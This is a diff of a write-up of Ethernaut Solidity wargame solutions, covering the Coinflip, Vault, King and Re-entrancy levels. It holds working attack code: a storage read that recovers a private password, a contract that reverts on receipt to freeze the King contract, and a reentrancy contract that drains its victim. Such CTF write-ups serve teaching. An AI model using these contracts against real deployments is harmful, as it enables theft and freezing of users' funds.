@@ -16,7 +16,7 @@ await contract.sendAllocation(await contract.owner());
 ```
 
 ## 3. Coinflip
-Don't rely on block number for any validation logic. I can calculate solution if both our txn in the same block and pass the result to your contract!
+Don't rely on block number for any validation logic. A malicious user can calculate the solution to bypass your validation if both txns in the same block i.e. wrapped in the same function call.
 ``` 
 pragma solidity ^0.6.0;
 import "./CoinFlip.sol";
@@ -101,28 +101,30 @@ contract AttackForce {
 ```
 
 ## 8. Vault
-Your private variables are private if you try to access it the normal way e.g. via another contract but the problem is that everything on the blockchain is visible so even if the variable's visibility is set to private, you can still access it based on its index in the smart contract. Learn more about this [here](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage).
+Your private variables are private if you try to access it the normal way e.g. via another contract but the problem is that everything on the blockchain is visible so even if the variable's visibility is set to private, you can still access it based on its index in the smart contract. Learn more about this [here](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage).x
 ```
 const password = await web3.eth.getStorageAt(instance, 1);
 await contract.unlock(password);
 ```
 
 ## 9. King
-This is a classic example of DDoS with unexpected revert whereby when the contract tries to do a transfer back to you address (contract), your payable fallback function will simply revert (or if you don't have 1) thus ensuring that nobody can overtake your position as king. 
+This is a classic example of DDoS with unexpected revert when part of the logic in the victim's contract involves transferring ether to the previous "lead", which in this case is the king. A malicious user would create a smart contract with either:
 
-edit: Make sure that when you sign the transaction with metamask, you manually increase the gas limit on the metamask transaction pop up. 4 mil gas limit is more than enough, too big and it might fail on the ropsten network (block limits on different networks vary)
+- a `fallback` / `receive` function that does `revert()`
+- or the absence of a `fallback` / `receive` function
+
+Once the malicious user uses this smart contract to take over the "king" position, all funds in the victim's contract is effectively stuck in there because nobody can take over as the new "king" no matter howm uch ether they use because the fallback function in the victim's contract will always fail when it tries to do `king.transfer(msg.value);`
 ```
-pragma solidity ^0.4.24;
+pragma solidity ^0.6.0;
 
-contract KingForever {
-
-    function takeover(address _target) public payable {
-        //target King contract
-        _target.call.value(msg.value).gas(4000000)();
+contract AttackForce {
+    
+    constructor(address payable _victim) public payable {
+        _victim.call.gas(1000000).value(1 ether)("");
     }
     
-    function getBalance() public view returns (uint) {
-        return address(this).balance;
+    receive() external payable {
+        revert();
     }
 }
 ```
@@ -133,36 +135,35 @@ Note that the number of times the fallback function runs is based on the amt of 
 
 You shouldn't try and give it like 7.8mil gas and try running it because it might reach the maximum stack size exceeded error. Just increase the amount of ether you withdraw each time!
 
-Also, not sure why the other approach (calling function via address.call() doesn't work for withdraw but it works for donating)
+Also, not sure why calling function via address.call() doesn't work for withdraw but it works for donating...
 ```
-pragma solidity ^0.4.24;
+pragma solidity ^0.6.0;
 
 import "./Reentrance.sol";
 
-contract DAOHack {
+contract AttackReentrancy {
+    address payable victim;
     
-    Reentrance private _victim;
-    
-    constructor(address victim) public {
-        _victim = Reentrance(victim);
+    constructor(address payable _victim) public payable {
+        victim = _victim;
+        
+        // Call Donate
+        bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
+        victim.call.value(msg.value)(payload);
     }
     
-    function pretendToDonate() public payable {
-        _victim.donate.value(msg.value)(address(this));
+    function maliciousWithdraw() public payable {
+        // Call withdraw
+        Reentrance(victim).withdraw(0.5 ether);
     }
     
-    function bleedItEmpty() public {
-        _victim.withdraw(0.5 ether);
+    fallback() external payable {
+        maliciousWithdraw();
     }
     
-    function() public payable {
-        bleedItEmpty();
+    function withdraw() public {
+        msg.sender.transfer(address(this).balance);
     }
-    
-    function checkBalance() public view returns(uint) {
-        return address(this).balance;
-    }
-    
 }
 ```
 
